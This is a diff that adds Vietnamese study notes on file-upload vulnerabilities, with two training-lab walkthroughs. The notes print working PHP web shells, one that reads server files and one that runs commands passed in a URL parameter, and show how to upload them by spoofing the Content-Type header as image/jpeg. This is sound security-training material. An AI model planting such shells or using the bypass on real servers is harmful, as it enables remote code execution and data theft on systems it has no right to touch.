@@ -25,5 +25,47 @@ Khi có một yêu cầu HTTP, máy chủ sẽ phân tích đường dẫn (URL)
 
 ## 2. Kỹ thuật Upload Backdoor:
 ### 2.1 Khai thác việc tải tệp không giới hạn để triển khai shell web
+Ví dụ:
+- Dòng lệnh PHP sau đây có thể được sử dụng để đọc các tệp tùy ý từ hệ thống tệp của máy chủ:
 
+`<?php echo file_get_contents('/path/to/target/file'); ?>`
+
+- Một web shell linh hoạt hơn có thể trông giống như thế này:
+
+`<?php echo system($_GET['command']); ?>`
+
+- Tập lệnh này cho phép bạn truyền lệnh hệ thống tùy ý thông qua tham số truy vấn như sau:
+
+`GET /example/exploit.php?command=id HTTP/1.1`
+📘 **LAB 1: THỰC THI MÃ TỪ XA THÔNG QUA TẢI LÊN WEB SHELL**
+Tải lên một web shell PHP cơ bản và sử dụng nó để trích xuất nội dung của tệp `/home/carlos/secret`
+
+Bước 1: Upload ảnh → xác nhận hiển thị → lọc lịch sử Burp theo MIME Image → tìm request GET đến file ảnh → gửi sang Repeater.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/71b5963b-0370-402c-b3d4-1400551e39bc" />
+Bước 2: Tạo một tệp có tên là `exploit.php`, chứa một tập lệnh để lấy nội dung tệp bí mật của Carlos. 
+
+`<?php echo file_get_contents('/home/carlos/secret'); ?>` 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0b07dd96-4ca1-4896-8f4d-86421bbaebb5" />
+Thông báo trong phản hồi xác nhận rằng tệp này đã được tải lên thành công.
+
+Bước 3: Trong Burp Repeater, hãy thay đổi đường dẫn của yêu cầu để trỏ đến tệp PHP: 
+
+`GET /files/avatars/exploit.php HTTP/1.1`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d6bb3d30-3347-465a-a0bd-d5bcf849693b" />
+Kết quả đầu ra: `1eCueh5dOL56ir9XPaW2KZgyc1GLbF9e`
 ### 2.2 Khai thác lỗi xác thực khi tải tệp lên
+#### 2.2.1 Xác thực loại tệp bị lỗi
+Các website thường có cơ chế chặn tệp độc hại, nhưng nhiều khi chỉ kiểm tra **Content-Type** trong phần upload. Vì tiêu đề này dễ bị giả mạo, kẻ tấn công có thể gửi file script độc hại nhưng gắn nhãn MIME như hình ảnh (`image/jpeg`). Nếu máy chủ không xác minh nội dung thực, webshell có thể được tải lên và thực thi, dẫn đến chiếm quyền điều khiển.
+
+📘 **LAB 2: TẢI LÊN WEB SHELL BẰNG CÁCH VƯỢT QUA HẠN CHẾ CONTENT-TYPE**
+Bước 1: Tạo một tệp có tên là exploit.php, chứa một tập lệnh để lấy nội dung bí mật của Carlos.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c0c6e4c7-4a8b-48a3-9c76-12cb96ae3446" />
+Phản hồi cho biết bạn chỉ được phép tải lên các tệp có định dạng MIME `image/jpeg` hoặc `image/png`.
+
+Bước 2:Trong phần nội dung tin nhắn liên quan đến tệp, hãy thay đổi giá trị được chỉ định Content-Type thành `image/jpeg`.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1c8fba88-e2e3-4fc3-84c6-912b65b23d31" />
+Phản hồi cho biết tệp đã được tải lên thành công.
+
+Bước 3: Chuyển sang tab Repeater khác chứa `GET /files/avatars/<YOUR-IMAGE>`. Trong đường dẫn, hãy thay thế tên tệp hình ảnh bằng `exploit.php` và gửi yêu cầu.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7e63a558-97c2-4c30-be0c-00f3654a1024" />
+
